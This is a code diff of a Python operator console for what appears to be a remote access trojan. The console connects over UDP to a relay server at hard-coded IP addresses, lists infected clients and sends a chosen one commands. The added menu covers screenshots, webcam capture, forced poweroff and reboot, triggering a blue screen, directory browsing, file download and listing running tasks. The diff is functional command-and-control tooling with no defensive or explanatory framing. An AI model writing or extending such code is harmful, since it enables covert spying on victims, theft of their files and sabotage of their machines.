@@ -8,8 +8,10 @@ import os
 
 alias = 'Manager'
 
-server_address = '165.227.129.69'
-server_port = 8008
+server_address = '10.1.18.200'
+#server_address = '127.0.0.1'
+#server_address = '157.245.7.127'
+server_port = 8000
 server = server_address, server_port
 
 client_address = ''
@@ -33,7 +35,7 @@ def receive():
 
 manager_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 manager_socket.bind(('', 0))
-manager_socket.sendto((f'{alias} connected to server').encode('utf-8'), server)
+manager_socket.sendto(f'Alias: {alias}'.encode('utf-8'), server)
 
 thread = threading.Thread(target=receive)
 thread.start()
@@ -47,15 +49,23 @@ while True:
   match key:
     case '1':
       manager_socket.sendto(('show client list').encode('utf-8'), server)
+      input('')
     case '2':
       client_address = input('Enter client address\n->')
       client_port = int(input('Enter client port\n->'))
       manager_socket.sendto((f'select a client: {client_address} {client_port}').encode('utf-8'), server)
     case '3':
       command = input('\tCommand:'
-              '\n1) S - Screenshot'
-              '\n2) W - Webcam'
-              '\n3) F - Files\n -> ')
+              '\nS - Screenshot'
+              '\nWS - Webcam screen'
+              '\nP - Poweroff'
+              '\nR - Reboot'
+              '\nB - BSoD'
+              '\nLS - Get current directory'
+              '\nCD [dir] - Change directory'
+              '\nDL [filename] - Download a file'
+              '\nTL - Get tasklist'
+              '\n -> ')
       selected_client = client_address, client_port
       manager_socket.sendto(f'{command}'.encode(), selected_client)
     case '4':
